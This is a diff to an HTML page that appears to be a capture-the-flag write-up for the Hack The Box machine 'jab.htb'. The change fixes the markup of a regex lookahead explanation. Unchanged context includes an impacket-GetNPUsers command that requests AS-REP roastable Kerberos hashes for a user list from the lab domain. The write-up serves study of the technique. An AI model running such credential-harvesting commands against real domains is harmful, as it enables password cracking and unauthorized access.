@@ -115,12 +115,12 @@ It is save in a predetermine format, so we create a list filtering not necessary
 <br /><br />
 <strong>[^&gt;]+</strong> : Any character that are not ‘greater than’
 <br /><br />
-**(?=<value>)** : It ensure the match is followed by <value> but is not part of the match
+<strong>(?=’value’)</strong> : It ensure the match is followed by <value> but is not part of the match
 <br /><br />
 **s/something//g** : It replaces any something with an empy string.
 <br /><br />
 ![Untitled](/assets/images/c9811d21-6d70-4416-99da-b9c1dc8d6c97-export-1a7ef455-6f10-4cae-8fc7-c315768e8fe8/c9811d21-6d70-4416-99da-b9c1dc8d6c97-export-1a7ef455-6f10-4cae-8fc7-c315768e8fe8_Untitled_12.png)
-<br /><br /></value></value></p>
+<br /><br /></value></p>
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers jab.htb/ <span class="nt">-userfile</span> list.lst <span class="nt">-request</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'UF_DONT_REQUIRE_PREAUTH '</span>
 </code></pre></div>    </div>
     <p><br /><br /></p>
